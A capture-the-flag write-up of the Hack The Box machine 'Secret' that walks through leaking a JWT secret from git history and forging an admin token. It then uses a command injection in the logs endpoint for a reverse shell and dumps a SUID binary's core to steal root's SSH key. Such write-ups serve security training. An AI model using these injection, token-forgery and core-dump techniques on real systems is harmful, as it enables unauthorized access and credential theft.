---
title: "Secret Hackthebox writeup"
author: "0xMesbaha"
cover: "/media/secret/20220326104620.png"
tags: ["Hackthebox", "API" ,"JWT", "SUID" , "core-dump"]
date: 2022-03-26T00:45:19+02:00
draft: false
---
In this Box we are going to follow documentation instructions to create a new user , will face sensitive data exposure will let us see a delete commit ,this will help us change our token to the admin token and login as admin , reading source codes we find a command injection so we will have a reverse shell as a user, for the root part there is a suid binary that can read any file on the system and count it , and in the source code it has ``PR_SET_DUMPABLE`` so we can dump it if it receives a signal while running ,we will send segmentation fault signal and dump the process then performing strings on the dump we can read the root ssh private key and login as root

<!--more-->

# Scanning :
```bash
nmap -A -T4 10.10.11.120 -oN nmap.txt

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: DUMB Docs
3000/tcp open  http    Node.js (Express middleware)
|_http-title: DUMB Docs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


# Enumerating :

we can  Follow the documentation guide to register a user :

![error](/media/secret/20220326105821.png)

so we can try :

```bash
curl -X POST http://10.10.11.120/api/user/register -H 'Content-Type: application/json' -d '{"name": "MESBAHA","email": "test@testers.com","password": "hecker"}'

```

![error](/media/secret/20220326110011.png)

and this is the expected response for a successful registration as we see in the Documentation

now we want to login with this user , we can check the documentation :

![error](/media/secret/20220326110215.png)

```bash
curl -X POST http://10.10.11.120/api/user/login -H 'Content-Type: application/json' -d '{"email": "test@testers.com","password": "hecker"}'

```

![error](/media/secret/20220326110253.png)

and this means we login successfully as documentation tells us :

![error](/media/secret/20220326110340.png)

now we can also see we can try access private route :

![error](/media/secret/20220326110541.png)

providing our token in the host header and making a get request :

```bash
curl -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNlZGEzZTQ0NWI1YzA0NWM2MzRlMTgiLCJuYW1lIjoiTUVTQkFIQSIsImVtYWlsIjoidGVzdEB0ZXN0ZXJzLmNvbSIsImlhdCI6MTY0ODI4NjQ1MH0.qw4zy4hLWs95jH4y09sEcgOFPxDtOEWaw9Xv_E5ZpOg" http://10.10.11.120/api/priv
```

![error](/media/secret/20220326110630.png)

so now we want to elevate to admin , we need to provide the admin token to login as admin rule.


we can see at the main page we can download the source-codes

![error](/media/secret/20220326111100.png)

maybe downloading the source codes can reveal more information to us

```bash
wget http://10.10.11.120/download/files.zip
unzip files.zip
```

![error](/media/secret/20220326111212.png)

and we can see it is a git repository , we can check the logs to see if the owner deleted something recently.
```bash
git log
```

![error](/media/secret/20220326111312.png)

and this log seems interesting , if we read the current ``.env``

```bash
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = secret
```

it contains the environment variables , there are very common mistakes can happen at this file like providing username and password at the connect variable or releasing secret tokens.

we can follow this path and see the previous version of ``.env``

```bash
git show 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
```
![error](/media/secret/20220326111644.png)

now we have the secret , we can go to [jwt.io](https://jwt.io/) providing our token and the secret we can modify the name to admin.

if we change it to admin it won't work , back to the Documnetation we will see admin name is "theadmin"
![error](/media/secret/20220326112313.png)

now moidify our token :

![error](/media/secret/20220326112348.png)

we can now use this token to request the ``/priv`` again
```bash
curl -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNlZGEzZTQ0NWI1YzA0NWM2MzRlMTgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3RAdGVzdGVycy5jb20iLCJpYXQiOjE2NDgyODY0NTB9.V0Sp_hlU1cYAZ_tYZ3_vHJuQ2saLfoiaxPrzZssD2-E" http://10.10.11.120/api/priv
```

![error](/media/secret/20220326112426.png)

![](https://media.giphy.com/media/wAxlCmeX1ri1y/giphy.gif)

now what 😂?

we can check the source code for the private route under ``local-web/routes/private.js``

![error](/media/secret/20220326112803.png)

if we make a get request as admin to ``/logs`` with parameter ``file`` it will execute command :

```bash
git log --oneline ${file}
```

we can try see if it works :

![error](/media/secret/20220326113127.png)

and it is working , we can try some command injection here :

```bash
curl -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNlZGEzZTQ0NWI1YzA0NWM2MzRlMTgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3RAdGVzdGVycy5jb20iLCJpYXQiOjE2NDgyODY0NTB9.V0Sp_hlU1cYAZ_tYZ3_vHJuQ2saLfoiaxPrzZssD2-E" "http://10.10.11.120/api/logs?file=index.js;id"
```

![error](/media/secret/20220326113231.png)


# Foothold:

Hence we have command injection we can now try to get a reverse shell .

the ``nc mkfifo`` payload works fine , at [revshells.com](https://www.revshells.com/), but make sure you url-encoded it , i have used [this](https://www.urlencoder.org/)

now we are in :

![error](/media/secret/20220326113630.png)

# Privilege escalation :

using [Linpeas](https://github.com/carlospolop/PEASS-ng/releases/download/20220320/linpeas.sh) or Just manual navigating in the system you will find under ``/opt``

![error](/media/secret/20220326113825.png)

and this binary has the suid bit which we can try to abuse

```bash
-rwsr-xr-x 1 root root 17824 Oct  7 10:03 count
```

if we try to run the program we can see it just counts the content in a file

![error](/media/secret/20220326114250.png)


### Analyzing the code

we can see the file we supply will be loaded , then the function will count it line by line and word by word,..etc
![error](/media/secret/20220326114400.png)

we can also see this comment and this code line :

![error](/media/secret/20220326114529.png)

this seems irregular to me

```C
    prctl(PR_SET_DUMPABLE, 1);
```

checking **prctl()** manual [here](https://man7.org/linux/man-pages/man2/prctl.2.html) we can find :

![error](/media/secret/20220326114727.png)

hence it is set to **1** in our case this means we can dump it if it receives a signal like "interrupt" while it is running

so we will get another reverse shell on another port

in shell-1 : run the binary and specify the file you want
in shell-2 : kill the process  ``ex: kill -SIGSEGV 1718 ``

now as we have dumped it where is the dumps ? , reading [here](https://refspecs.linuxfoundation.org/FHS_2.3/fhs-2.3.html#VARCRASHSYSTEMCRASHDUMPS) it should be at ``/var/crash``

![error](/media/secret/20220326120021.png)

shell -1 :

![error](/media/secret/20220326120642.png)

shell -2 :

get PID from the ``ps aux`` command

![error](/media/secret/20220326120717.png)

and we see our dump :

![error](/media/secret/20220326120755.png)

reading [here](https://askubuntu.com/questions/434431/how-can-i-read-a-crash-file-from-var-crash) to know what to do with a ``.crash`` file

```bash
apport-unpack  _opt_count.1000.crash /tmp/dumps
```

now perform ``strings`` on ``CoreDump``

![error](/media/secret/20220326121010.png)



## Root Access

Hence we Have port **22** open ,now save the ``id_rsa`` and :

```bash
chmod 600 id_rsa
ssh root@10.10.11.120 -i id_rsa
```

![error](/media/secret/20220326121210.png)
